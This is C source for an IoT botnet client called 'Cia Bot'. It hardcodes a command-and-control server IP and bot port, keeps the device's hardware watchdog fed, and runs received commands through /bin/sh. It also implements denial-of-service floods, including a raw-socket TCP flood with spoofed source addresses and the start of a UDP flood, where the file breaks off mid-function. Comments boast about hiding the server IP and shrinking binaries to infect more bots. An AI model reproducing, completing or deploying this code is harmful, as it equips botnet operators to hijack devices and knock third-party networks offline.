/*
 Cia Bot Developed By Gcezp
 Fixed by Leo again....
 Encryped Strings. IP and BP Is Hidden In The Bins
*/
/////////////////////////////////
#include "headers/includes.h"
#include "headers/util.h"
#include "headers/table.h"
#include "headers/main.h"
////////////////////////////////
#define STD2_SIZE 200
#define std_packets 1294
#define STD_PSIZE 1365 
#define srv_lst_sz (sizeof(HostIp))
#define HostIp "23.94.22.102" //SERVER IP HERE!
///////////////////////////////
int Bot_Port = 9283;// Change This If You Want 
///////////
const char *useragents[] = {
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
	"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1",
	"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)",
	"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
	"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)",
	"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",
	"Mozilla/5.0 (PLAYSTATION 3; 3.55)",
	"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2",
	"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)",
	"Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)",
	"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5",
	"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc",
	"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk",
	"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",
	"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)",
	"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15",
	"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable",
	"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable",
	"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2",
	"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3",
	"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",
	"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",
	"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
	"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
    "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
	"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36",
	"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36",
	"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00",
	"Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)",
	"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
	"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)",
	"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)",
	"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)",
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0",
	"PSP (PlayStation Portable); 2.00",
	"Bunjalloo/0.7.6(Nintendo DS;U;en)",
    "Doris/1.15 [en] (Symbian)",
	"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100",
	"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01",
	"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)",
	"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0",
	"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0",
	"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
	"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0",
	"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0",
	"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000",
	"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0",
	"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8",
	"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
	"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
	"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1",
	"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
	"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
	"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
};
int fd_ctrl = -1, fd_serv = -1;
void watchdog_maintain(void){
    watchdog_pid = fork();
    if(watchdog_pid > 0 || watchdog_pid == -1)
        return;
    int timeout = 1;
    int watchdog_fd = 0;
    int found = FALSE;
    table_unlock_val(TABLE_MISC_WATCHDOG);
    table_unlock_val(TABLE_MISC_WATCHDOG2);
    if((watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG, NULL), 2)) != -1 ||
       (watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG2, NULL), 2)) != -1){
        found = TRUE;
        ioctl(watchdog_fd, 0x80045704, &timeout);
    }
    
    if(found){
        while(TRUE){
            ioctl(watchdog_fd, 0x80045705, 0);
            sleep(10);
        }
    }
    table_lock_val(TABLE_MISC_WATCHDOG);
    table_lock_val(TABLE_MISC_WATCHDOG2);
    exit(0);
}
void init_rand(uint32_t x){
    int i;

    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;

    for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
void trim(char *str){
    int i;
    int begin = 0;
    int end = strlen(str) - 1;

    while (isspace(str[begin])) begin++;

    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];

    str[i - begin] = '\0';
}
uint32_t rand_cmwc(void){
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    uint32_t x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (uint32_t)(t >> 32);
    x = t + c;
    if (x < c) {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}
void rand_alphastr(uint8_t *str, int len){ // Random alphanumeric string, more expensive than rand_str
    table_unlock_val(TABLE_MISC_RANDSTRING);
    char *alphaset = table_retrieve_val(TABLE_MISC_RANDSTRING, NULL);
    while (len > 0){
        if (len >= sizeof (uint32_t)){
            int i;
            uint32_t entropy = rand_cmwc();;
            for (i = 0; i < sizeof (uint32_t); i++){
                uint8_t tmp = entropy & 0xff;
                entropy = entropy >> 8;
                tmp = tmp >> 3;
                *str++ = alphaset[tmp];
            }
            len -= sizeof (uint32_t);
        }
        else{
            *str++ = rand_cmwc() % (sizeof (alphaset));
            len--;
        }
    }
    table_lock_val(TABLE_MISC_RANDSTRING);
}
static void printchar(unsigned char **str, int c){
    if(str) {
        **str = c;
        ++(*str);
    }
    else (void)write(1, &c, 1);
}
static int prints(unsigned char **out, const unsigned char *string, int width, int pad){
    register int pc = 0, padchar = ' ';
    if (width > 0) {
        register int len = 0;
        register const unsigned char *ptr;
        for (ptr = string; *ptr; ++ptr) ++len;
        if (len >= width) width = 0;
        else width -= len;
        if (pad & pad_z) padchar = '0';
    }
    if (!(pad & pad_r)) {
        for ( ; width > 0; --width) {
            printchar (out, padchar);
            ++pc;
        }
    }
    for ( ; *string ; ++string) {
        printchar (out, *string);
           ++pc;
    }
    for ( ; width > 0; --width) {
        printchar (out, padchar);
        ++pc;
    }
    return pc;
}
static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase){
    unsigned char print_buf[printbuf_len];
    register unsigned char *s;
    register int t, neg = 0, pc = 0;
    register unsigned int u = i;
    if (i == 0) {
        print_buf[0] = '0';
        print_buf[1] = '\0';
        return prints (out, print_buf, width, pad);
    }
    if (sg && b == 10 && i < 0) {
        neg = 1;
        u = -i;
    }
    s = print_buf + printbuf_len-1;
    *s = '\0';
    while (u) {
        t = u % b;
        if( t >= 10 )
        t += letbase - '0' - 10;
        *--s = t + '0';
        u /= b;
    }
    if (neg) {
        if( width && (pad & pad_z) ) {
               printchar (out, '-');
            ++pc;
            --width;
        }
        else{
            *--s = '-';
        }
    }
    return pc + prints (out, s, width, pad);
}
static int print(unsigned char **out, const unsigned char *format, va_list args ){
    register int width, pad;
    register int pc = 0;
    unsigned char scr[2];
    for (; *format != 0; ++format) {
        if (*format == '%') {
            ++format;
            width = pad = 0;
            if (*format == '\0') break;
            if (*format == '%') goto out;
            if (*format == '-') {
                ++format;
                pad = pad_r;
            }
            while (*format == '0') {
                ++format;
                pad |= pad_z;
            }
            for ( ; *format >= '0' && *format <= '9'; ++format) {
                width *= 10;
                width += *format - '0';
            }
            if( *format == 's' ) {
                register char *s = (char *)va_arg( args, intptr_t );
                pc += prints (out, s?s:"(null)", width, pad);
                continue;
            }
            if( *format == 'd' ) {
                pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
                continue;
            }
            if( *format == 'x' ) {
                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
                continue;
            }
            if( *format == 'X' ) {
                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
                continue;
            }
            if( *format == 'u' ) {
                pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
                continue;
            }
            if( *format == 'c' ) {
                scr[0] = (unsigned char)va_arg( args, int );
                scr[1] = '\0';
                pc += prints (out, scr, width, pad);
                continue;
            }
        }
        else {
out:
            printchar (out, *format);
            ++pc;
        }
    }
    if (out) **out = '\0';
    va_end( args );
    return pc;
}
int zprintf(const unsigned char *format, ...){
    va_list args;
    va_start( args, format );
    return print( 0, format, args );
}
int szprintf(unsigned char *out, const unsigned char *format, ...){
    va_list args;
    va_start( args, format );
    return print( &out, format, args );
}
int sockprintf(int sock, char *formatStr, ...){
    unsigned char *textBuffer = malloc(2048);
    memset(textBuffer, 0, 2048);
    char *orig = textBuffer;
    va_list args;
    va_start(args, formatStr);
    print(&textBuffer, formatStr, args);
    va_end(args);
    orig[strlen(orig)] = '\n';
    //zprintf("buf: %s\n", orig);
    int q = send(sock,orig,strlen(orig), MSG_NOSIGNAL);
    free(orig);
    return q;
}

static int *fdopen_pids;

int fdpopen(unsigned char *program, register unsigned char *type){
    register int iop;
    int pdes[2], fds, pid;
    if (*type != 'r' && *type != 'w' || type[1]) return -1;
    if (pipe(pdes) < 0) return -1;
    if (fdopen_pids == NULL) {
        if ((fds = getdtablesize()) <= 0) return -1;
        if ((fdopen_pids = (int *)malloc((unsigned int)(fds * sizeof(int)))) == NULL) return -1;
        memset((unsigned char *)fdopen_pids, 0, fds * sizeof(int));
    }
    switch (pid = vfork())
    {
    case -1:
        close(pdes[0]);
        close(pdes[1]);
        return -1;
    case 0:
        if (*type == 'r') {
            if (pdes[1] != 1) {
                dup2(pdes[1], 1);
                close(pdes[1]);
            }
            close(pdes[0]);
        } else {
            if (pdes[0] != 0) {
                (void) dup2(pdes[0], 0);
                (void) close(pdes[0]);
            }
            (void) close(pdes[1]);
        }
        execl("/bin/sh", "sh", "-c", program, NULL);
        _exit(127);
    }
    if (*type == 'r') {
        iop = pdes[0];
        (void) close(pdes[1]);
    } else {
        iop = pdes[1];
        (void) close(pdes[0]);
    }
    fdopen_pids[iop] = pid;
    return (iop);
}
int fdpclose(int iop){
    register int fdes;
    sigset_t omask, nmask;
    int pstat;
    register int pid;

    if (fdopen_pids == NULL || fdopen_pids[iop] == 0) return (-1);
    (void) close(iop);
    sigemptyset(&nmask);
    sigaddset(&nmask, SIGINT);
    sigaddset(&nmask, SIGQUIT);
    sigaddset(&nmask, SIGHUP);
    (void) sigprocmask(SIG_BLOCK, &nmask, &omask);
    do {
        pid = waitpid(fdopen_pids[iop], (int *) &pstat, 0);
    } while (pid == -1 && errno == EINTR);
    (void) sigprocmask(SIG_SETMASK, &omask, NULL);
    fdopen_pids[fdes] = 0;
    return (pid == -1 ? -1 : WEXITSTATUS(pstat));
}
unsigned char *fdgets(unsigned char *buffer, int bufferSize, int fd){
    int got = 1, total = 0;
    while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
    return got == 0 ? NULL : buffer;
}
static const long hextable[] = {
    [0 ... 255] = -1,
    ['0'] = 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,
    ['A'] = 10, 11, 12, 13, 14, 15,
    ['a'] = 10, 11, 12, 13, 14, 15
};
long parseHex(unsigned char *hex){
    long ret = 0;
    while (*hex && ret >= 0) ret = (ret << 4) | hextable[*hex++];
    return ret;
}
int wildString(const unsigned char* pattern, const unsigned char* string) {
    switch(*pattern)
    {
    case '\0': return *string;
    case '*': return !(!wildString(pattern+1, string) || *string && !wildString(pattern, string+1));
    case '?': return !(*string && !wildString(pattern+1, string+1));
    default: return !((toupper(*pattern) == toupper(*string)) && !wildString(pattern+1, string+1));
    }
}

int getHost(unsigned char *toGet, struct in_addr *i){
    struct hostent *h;
    if((i->s_addr = inet_addr(toGet)) == -1) return 1;
    return 0;
}
void uppercase(unsigned char *str){
    while(*str) { *str = toupper(*str); str++; }
}
void makeRandomStr(unsigned char *buf, int length){
    int i = 0;
    for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65;
}
int recvLine(int socket, unsigned char *buf, int bufsize){
    memset(buf, 0, bufsize);

    fd_set myset;
    struct timeval tv;
    tv.tv_sec = 30;
    tv.tv_usec = 0;
    FD_ZERO(&myset);
    FD_SET(socket, &myset);
    int selectRtn, retryCount;
    if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
        while(retryCount < 10)
        {
            tv.tv_sec = 30;
            tv.tv_usec = 0;
            FD_ZERO(&myset);
            FD_SET(socket, &myset);
            if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                retryCount++;
                continue;
            }
            break;
        }
    }
    unsigned char tmpchr;
    unsigned char *cp;
    int count = 0;
    cp = buf;
    while(bufsize-- > 1){
        if(recv(KHcommSOCK, &tmpchr, 1, 0) != 1) {
            *cp = 0x00;
            return -1;
        }
        *cp++ = tmpchr;
        if(tmpchr == '\n') break;
        count++;
    }
    *cp = 0x00;
//      zprintf("recv: %s\n", cp);
    return count;
}
int connectTimeout(int fd, char *host, int port, int timeout){
    struct sockaddr_in dest_addr;
    fd_set myset;
    struct timeval tv;
    socklen_t lon;
    int valopt;
    long arg = fcntl(fd, F_GETFL, NULL);
    arg |= O_NONBLOCK;
    fcntl(fd, F_SETFL, arg);

    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    if(getHost(host, &dest_addr.sin_addr)) return 0;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

    if (res < 0) {
        if (errno == EINPROGRESS) {
            tv.tv_sec = timeout;
            tv.tv_usec = 0;
            FD_ZERO(&myset);
            FD_SET(fd, &myset);
            if (select(fd+1, NULL, &myset, NULL, &tv) > 0) {
                lon = sizeof(int);
                getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                if (valopt) return 0;
            }
            else return 0;
        }
        else return 0;
    }
    arg = fcntl(fd, F_GETFL, NULL);
    arg &= (~O_NONBLOCK);
    fcntl(fd, F_SETFL, arg);
    return 1;
}
int listFork(){
    uint32_t parent, *newpids, i;
    parent = fork();
    if (parent <= 0) return parent;
    numpids++;
    newpids = (uint32_t*)malloc((numpids + 1) * 4);
    for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
    newpids[numpids - 1] = parent;
    free(pids);
    pids = newpids;
    return parent;
}
in_addr_t findRandIP(in_addr_t netmask){
    in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
    return tmp ^ ( rand_cmwc() & ~netmask);
}
unsigned short csum (unsigned short *buf, int count){
    register uint64_t sum = 0;
    while( count > 1 ) { sum += *buf++; count -= 2; }
    if(count > 0) { sum += *(unsigned char *)buf; }
    while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
    return (uint16_t)(~sum);
}
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph){
    struct tcp_pseudo{
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;
    unsigned short total_len = iph->tot_len;
    pseudohead.src_addr=iph->saddr;
    pseudohead.dst_addr=iph->daddr;
    pseudohead.zero=0;
    pseudohead.proto=IPPROTO_TCP;
    pseudohead.length=htons(sizeof(struct tcphdr));
    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
    unsigned short *tcp = malloc(totaltcp_len);
    memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
    memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
    unsigned short output = csum(tcp,totaltcp_len);
    free(tcp);
    return output;
}
void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize){
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + packetSize;
    iph->id = rand_cmwc();
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = protocol;
    iph->check = 0;
    iph->saddr = source;
    iph->daddr = dest;
}
/* This Is Where The Flood Scripts Start.
Yes There Are Only 4 Floods. The Less Floods The Smaller The Bins. (Smaller Bins = More Bots)
Please Don't Rename The Methods.
*/
void TCPFlood(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize, int pollinterval){
        register unsigned int pollRegister;
        pollRegister = pollinterval;

        struct sockaddr_in dest_addr;

        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(!sockfd){
                return;
        }

        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0){
                return;
        }

        in_addr_t netmask;

        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );

        unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( findRandIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

        tcph->source = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->ack_seq = 0;
        tcph->doff = 5;

        if(!strcmp(flags, "all")){
                tcph->syn = 1;
                tcph->rst = 1;
                tcph->fin = 1;
                tcph->ack = 1;
                tcph->psh = 1;
        } else {
                unsigned char *pch = strtok(flags, ",");
                while(pch){
                        if(!strcmp(pch,         "syn"))
                        {
                                tcph->syn = 1;
                        } else if(!strcmp(pch,  "rst"))
                        {
                                tcph->rst = 1;
                        } else if(!strcmp(pch,  "fin"))
                        {
                                tcph->fin = 1;
                        } else if(!strcmp(pch,  "ack"))
                        {
                                tcph->ack = 1;
                        } else if(!strcmp(pch,  "psh"))
                        {
                                tcph->psh = 1;
                        } else {
                        }
                        pch = strtok(NULL, ",");
                }
        }

        tcph->window = rand_cmwc();
        tcph->check = 0;
        tcph->urg_ptr = 0;
        tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
        tcph->check = tcpcsum(iph, tcph);

        iph->check = csum ((unsigned short *) packet, iph->tot_len);

        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        while(1){
                sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                iph->saddr = htonl( findRandIP(netmask) );
                iph->id = rand_cmwc();
                tcph->seq = rand_cmwc();
                tcph->source = rand_cmwc();
                tcph->check = 0;
                tcph->check = tcpcsum(iph, tcph);
                iph->check = csum ((unsigned short *) packet, iph->tot_len);

                if(i == pollRegister){
                        if(time(NULL) > end) break;
                        i = 0;
                        continue;
                }
                i++;
        }
}
void Hexed(unsigned char *ip, int port, int secs){
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
 
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname(ip);
 
    bzero((char*) &sin,sizeof(sin));
